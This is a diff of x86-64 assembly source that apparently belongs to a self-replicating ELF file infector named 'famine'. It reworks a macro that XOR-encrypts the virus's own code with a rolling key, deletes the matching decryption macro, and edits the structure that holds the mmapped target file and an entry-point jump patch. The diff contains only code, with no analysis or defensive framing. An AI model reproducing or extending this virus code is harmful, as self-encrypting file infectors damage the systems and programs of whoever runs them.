@@ -86,8 +86,8 @@
 %macro CYPHER 0
 	xor r11, r11
 	mov rdi, 0xAA  ; key
-	mov rax, _start.enc_start
-	lea rdx, STACK(famine.tocypher + _start.enc_start - _start)
+	mov rax, .enc_start
+	lea rdx, [rel .enc_start]
 	mov rcx, enc_end
 	sub rcx, rax
 	.cyphering:
@@ -99,21 +99,6 @@
 		loop .cyphering
 %endmacro
 
-%macro DECYPHER 0
-	xor r11, r11
-	mov rdi, 0xAA  ; key
-	mov rax, .enc_start
-	lea rdx, [rel .enc_start]
-	mov rcx, enc_end
-	sub rcx, rax
-	.decyphering:
-		mov r11b, byte [rdx]
-		xor r11, rdi
-		mov byte [rdx], r11b
-		inc rdx
-		inc rdi
-		loop .decyphering
-%endmacro
 ;Structures
 
 	struc	dirent
@@ -192,5 +177,4 @@
 .file_size		resq	1				; Size of open file
 .jmp			resb	5				; jmp :  e9 xx xx xx xx 
 .file_data		resq	1				; Pointer to mmapped file data
-.tocypher		resb	0x5000
 endstruc
